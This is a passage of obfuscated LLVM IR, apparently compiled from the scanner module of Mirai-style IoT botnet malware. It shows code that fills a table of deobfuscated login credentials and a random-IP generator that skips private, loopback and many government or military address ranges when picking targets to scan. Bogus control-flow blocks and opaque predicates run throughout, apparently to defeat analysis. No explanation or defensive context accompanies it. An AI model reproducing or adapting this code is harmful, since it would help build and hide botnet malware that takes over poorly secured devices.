  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %98, i64 %100
  %102 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %101, i32 0, i32 0
  store i8* %97, i8** %102, align 8
  %103 = load i32, i32* %87, align 4
  %104 = trunc i32 %103 to i8
  %105 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %106 = load i32, i32* @auth_table_len, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %105, i64 %107
  %109 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %108, i32 0, i32 4
  store i8 %104, i8* %109, align 4
  %110 = load i8*, i8** %85, align 8
  %111 = call i8* @deobf(i8* %110, i32* %87)
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %113 = load i32, i32* @auth_table_len, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i64 %114
  %116 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i32 0, i32 1
  store i8* %111, i8** %116, align 8
  %117 = load i32, i32* %87, align 4
  %118 = trunc i32 %117 to i8
  %119 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %120 = load i32, i32* @auth_table_len, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %119, i64 %121
  %123 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %122, i32 0, i32 5
  store i8 %118, i8* %123, align 1
  %124 = load i16, i16* @auth_table_max_weight, align 2
  %125 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %126 = load i32, i32* @auth_table_len, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %125, i64 %127
  %129 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %128, i32 0, i32 2
  store i16 %124, i16* %129, align 8
  %130 = load i16, i16* @auth_table_max_weight, align 2
  %131 = zext i16 %130 to i32
  %132 = load i16, i16* %86, align 2
  %133 = zext i16 %132 to i32
  %_22 = shl i32 %131, %133
  %_23 = sub i32 0, %131
  %gen24 = add i32 %_23, %133
  %_25 = sub i32 %131, %133
  %gen26 = mul i32 %_25, %133
  %_27 = shl i32 %131, %133
  %_28 = sub i32 0, %131
  %gen29 = add i32 %_28, %133
  %134 = add nsw i32 %131, %133
  %135 = trunc i32 %134 to i16
  %136 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %137 = load i32, i32* @auth_table_len, align 4
  %_30 = sub i32 0, %137
  %gen31 = add i32 %_30, 1
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* @auth_table_len, align 4
  %139 = sext i32 %137 to i64
  %140 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %136, i64 %139
  %141 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %140, i32 0, i32 3
  store i16 %135, i16* %141, align 2
  %142 = load i16, i16* %86, align 2
  %143 = zext i16 %142 to i32
  %144 = load i16, i16* @auth_table_max_weight, align 2
  %145 = zext i16 %144 to i32
  %_32 = shl i32 %145, %143
  %_33 = sub i32 0, %145
  %gen34 = add i32 %_33, %143
  %_35 = sub i32 0, %145
  %gen36 = add i32 %_35, %143
  %_37 = sub i32 %145, %143
  %gen38 = mul i32 %_37, %143
  %_39 = sub i32 %145, %143
  %gen40 = mul i32 %_39, %143
  %_41 = sub i32 %145, %143
  %gen42 = mul i32 %_41, %143
  %146 = add nsw i32 %145, %143
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* @auth_table_max_weight, align 2
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = load i32, i32* @x.57
  %2 = load i32, i32* @y.58
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = load i32, i32* @x.57
  %15 = load i32, i32* @y.58
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %5259, %originalBBpart2
  %23 = call i32 @rand_next()
  store i32 %23, i32* %9, align 4
  %24 = load i32, i32* %9, align 4
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %10, align 1
  %27 = load i32, i32* %9, align 4
  %28 = lshr i32 %27, 8
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %11, align 1
  %31 = load i32, i32* %9, align 4
  %32 = lshr i32 %31, 16
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i32, i32* %9, align 4
  %36 = lshr i32 %35, 24
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %13, align 1
  br label %39

; <label>:39:                                     ; preds = %22
  %40 = load i8, i8* %10, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 127
  br i1 %42, label %5259, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* %10, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %5259, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.57
  %49 = load i32, i32* @y.58
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i8, i8* %10, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 3
  %59 = load i32, i32* @x.57
  %60 = load i32, i32* @y.58
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %5259, label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i8, i8* %10, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 15
  br i1 %70, label %5259, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %10, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 56
  br i1 %74, label %5259, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @x.57
  %77 = load i32, i32* @y.58
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i8, i8* %10, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 10
  %87 = load i32, i32* @x.57
  %88 = load i32, i32* @y.58
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %86, label %5259, label %95

; <label>:95:                                     ; preds = %originalBBpart28
  %96 = load i32, i32* @x.57
  %97 = load i32, i32* @y.58
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load i8, i8* %10, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 25
  %107 = load i32, i32* @x.57
  %108 = load i32, i32* @y.58
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %106, label %5259, label %115

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = load i32, i32* @x.57
  %117 = load i32, i32* @y.58
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %115
  %124 = load i8, i8* %10, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 49
  %127 = load i32, i32* @x.57
  %128 = load i32, i32* @y.58
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %126, label %5259, label %135

; <label>:135:                                    ; preds = %originalBBpart216
  %136 = load i8, i8* %10, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 50
  br i1 %138, label %5259, label %139

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %10, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 137
  br i1 %142, label %5259, label %143

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %10, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 6
  br i1 %146, label %5259, label %147

; <label>:147:                                    ; preds = %143
  %148 = load i32, i32* @x.57
  %149 = load i32, i32* @y.58
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %147
  %156 = load i8, i8* %10, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 7
  %159 = load i32, i32* @x.57
  %160 = load i32, i32* @y.58
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %158, label %5259, label %167

; <label>:167:                                    ; preds = %originalBBpart220
  %168 = load i8, i8* %10, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 11
  br i1 %170, label %5259, label %171

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %10, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 21
  br i1 %174, label %5259, label %175

; <label>:175:                                    ; preds = %171
  %176 = load i8, i8* %10, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 22
  br i1 %178, label %5259, label %179

; <label>:179:                                    ; preds = %175
  %180 = load i8, i8* %10, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 26
  br i1 %182, label %5259, label %183

; <label>:183:                                    ; preds = %179
  %184 = load i8, i8* %10, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 28
  br i1 %186, label %5259, label %187

; <label>:187:                                    ; preds = %183
  %188 = load i8, i8* %10, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 29
  br i1 %190, label %5259, label %191

; <label>:191:                                    ; preds = %187
  %192 = load i8, i8* %10, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 30
  br i1 %194, label %5259, label %195

; <label>:195:                                    ; preds = %191
  %196 = load i32, i32* @x.57
  %197 = load i32, i32* @y.58
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %195
  %204 = load i8, i8* %10, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 33
  %207 = load i32, i32* @x.57
  %208 = load i32, i32* @y.58
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %206, label %5259, label %215

; <label>:215:                                    ; preds = %originalBBpart224
  %216 = load i8, i8* %10, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 55
  br i1 %218, label %5259, label %219

; <label>:219:                                    ; preds = %215
  %220 = load i8, i8* %10, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 214
  br i1 %222, label %5259, label %223

; <label>:223:                                    ; preds = %219
  %224 = load i32, i32* @x.57
  %225 = load i32, i32* @y.58
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %223
  %232 = load i8, i8* %10, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 215
  %235 = load i32, i32* @x.57
  %236 = load i32, i32* @y.58
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %234, label %5259, label %243

; <label>:243:                                    ; preds = %originalBBpart228
  %244 = load i8, i8* %10, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 192
  br i1 %246, label %247, label %267

; <label>:247:                                    ; preds = %243
  %248 = load i32, i32* @x.57
  %249 = load i32, i32* @y.58
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %247
  %256 = load i8, i8* %11, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 168
  %259 = load i32, i32* @x.57
  %260 = load i32, i32* @y.58
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %258, label %5259, label %267

; <label>:267:                                    ; preds = %originalBBpart232, %243
  %268 = load i8, i8* %10, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 146
  br i1 %270, label %271, label %291

; <label>:271:                                    ; preds = %267
  %272 = load i32, i32* @x.57
  %273 = load i32, i32* @y.58
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %271
  %280 = load i8, i8* %11, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 17
  %283 = load i32, i32* @x.57
  %284 = load i32, i32* @y.58
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %282, label %5259, label %291

; <label>:291:                                    ; preds = %originalBBpart236, %267
  %292 = load i32, i32* @x.57
  %293 = load i32, i32* @y.58
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %291
  %300 = load i8, i8* %10, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 146
  %303 = load i32, i32* @x.57
  %304 = load i32, i32* @y.58
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %302, label %311, label %331

; <label>:311:                                    ; preds = %originalBBpart240
  %312 = load i32, i32* @x.57
  %313 = load i32, i32* @y.58
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %311
  %320 = load i8, i8* %11, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 80
  %323 = load i32, i32* @x.57
  %324 = load i32, i32* @y.58
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %322, label %5259, label %331

; <label>:331:                                    ; preds = %originalBBpart244, %originalBBpart240
  %332 = load i32, i32* @x.57
  %333 = load i32, i32* @y.58
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %331
  %340 = load i8, i8* %10, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 146
  %343 = load i32, i32* @x.57
  %344 = load i32, i32* @y.58
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %342, label %351, label %355

; <label>:351:                                    ; preds = %originalBBpart248
  %352 = load i8, i8* %11, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 98
  br i1 %354, label %5259, label %355

; <label>:355:                                    ; preds = %351, %originalBBpart248
  %356 = load i8, i8* %10, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 146
  br i1 %358, label %359, label %363

; <label>:359:                                    ; preds = %355
  %360 = load i8, i8* %11, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 154
  br i1 %362, label %5259, label %363

; <label>:363:                                    ; preds = %359, %355
  %364 = load i32, i32* @x.57
  %365 = load i32, i32* @y.58
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %363
  %372 = load i8, i8* %10, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 147
  %375 = load i32, i32* @x.57
  %376 = load i32, i32* @y.58
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %374, label %383, label %387

; <label>:383:                                    ; preds = %originalBBpart252
  %384 = load i8, i8* %11, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 159
  br i1 %386, label %5259, label %387

; <label>:387:                                    ; preds = %383, %originalBBpart252
  %388 = load i8, i8* %10, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 148
  br i1 %390, label %391, label %411

; <label>:391:                                    ; preds = %387
  %392 = load i32, i32* @x.57
  %393 = load i32, i32* @y.58
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %391
  %400 = load i8, i8* %11, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 114
  %403 = load i32, i32* @x.57
  %404 = load i32, i32* @y.58
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %402, label %5259, label %411

; <label>:411:                                    ; preds = %originalBBpart256, %387
  %412 = load i8, i8* %10, align 1
  %413 = zext i8 %412 to i32
  %414 = icmp eq i32 %413, 150
  br i1 %414, label %415, label %419

; <label>:415:                                    ; preds = %411
  %416 = load i8, i8* %11, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 125
  br i1 %418, label %5259, label %419

; <label>:419:                                    ; preds = %415, %411
  %420 = load i8, i8* %10, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 150
  br i1 %422, label %423, label %427

; <label>:423:                                    ; preds = %419
  %424 = load i8, i8* %11, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp eq i32 %425, 133
  br i1 %426, label %5259, label %427

; <label>:427:                                    ; preds = %423, %419
  %428 = load i8, i8* %10, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 150
  br i1 %430, label %431, label %435

; <label>:431:                                    ; preds = %427
  %432 = load i8, i8* %11, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 144
  br i1 %434, label %5259, label %435

; <label>:435:                                    ; preds = %431, %427
  %436 = load i8, i8* %10, align 1
  %437 = zext i8 %436 to i32
  %438 = icmp eq i32 %437, 150
  br i1 %438, label %439, label %443

; <label>:439:                                    ; preds = %435
  %440 = load i8, i8* %11, align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 149
  br i1 %442, label %5259, label %443

; <label>:443:                                    ; preds = %439, %435
  %444 = load i8, i8* %10, align 1
  %445 = zext i8 %444 to i32
  %446 = icmp eq i32 %445, 150
  br i1 %446, label %447, label %451

; <label>:447:                                    ; preds = %443
  %448 = load i8, i8* %11, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp eq i32 %449, 157
  br i1 %450, label %5259, label %451

; <label>:451:                                    ; preds = %447, %443
  %452 = load i8, i8* %10, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 150
  br i1 %454, label %455, label %459

; <label>:455:                                    ; preds = %451
  %456 = load i8, i8* %11, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp eq i32 %457, 184
  br i1 %458, label %5259, label %459

; <label>:459:                                    ; preds = %455, %451
  %460 = load i8, i8* %10, align 1
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 150
  br i1 %462, label %463, label %483

; <label>:463:                                    ; preds = %459
  %464 = load i32, i32* @x.57
  %465 = load i32, i32* @y.58
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %463
  %472 = load i8, i8* %11, align 1
  %473 = zext i8 %472 to i32
  %474 = icmp eq i32 %473, 190
  %475 = load i32, i32* @x.57
  %476 = load i32, i32* @y.58
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %474, label %5259, label %483

; <label>:483:                                    ; preds = %originalBBpart260, %459
  %484 = load i32, i32* @x.57
  %485 = load i32, i32* @y.58
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %483
  %492 = load i8, i8* %10, align 1
  %493 = zext i8 %492 to i32
  %494 = icmp eq i32 %493, 150
  %495 = load i32, i32* @x.57
  %496 = load i32, i32* @y.58
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %494, label %503, label %507

; <label>:503:                                    ; preds = %originalBBpart264
  %504 = load i8, i8* %11, align 1
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 196
  br i1 %506, label %5259, label %507

; <label>:507:                                    ; preds = %503, %originalBBpart264
  %508 = load i8, i8* %10, align 1
  %509 = zext i8 %508 to i32
  %510 = icmp eq i32 %509, 152
  br i1 %510, label %511, label %531

; <label>:511:                                    ; preds = %507
  %512 = load i32, i32* @x.57
  %513 = load i32, i32* @y.58
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %511
  %520 = load i8, i8* %11, align 1
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 82
  %523 = load i32, i32* @x.57
  %524 = load i32, i32* @y.58
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %522, label %5259, label %531

; <label>:531:                                    ; preds = %originalBBpart268, %507
  %532 = load i8, i8* %10, align 1
  %533 = zext i8 %532 to i32
  %534 = icmp eq i32 %533, 152
  br i1 %534, label %535, label %555

; <label>:535:                                    ; preds = %531
  %536 = load i32, i32* @x.57
  %537 = load i32, i32* @y.58
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %535
  %544 = load i8, i8* %11, align 1
  %545 = zext i8 %544 to i32
  %546 = icmp eq i32 %545, 229
  %547 = load i32, i32* @x.57
  %548 = load i32, i32* @y.58
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %546, label %5259, label %555

; <label>:555:                                    ; preds = %originalBBpart272, %531
  %556 = load i8, i8* %10, align 1
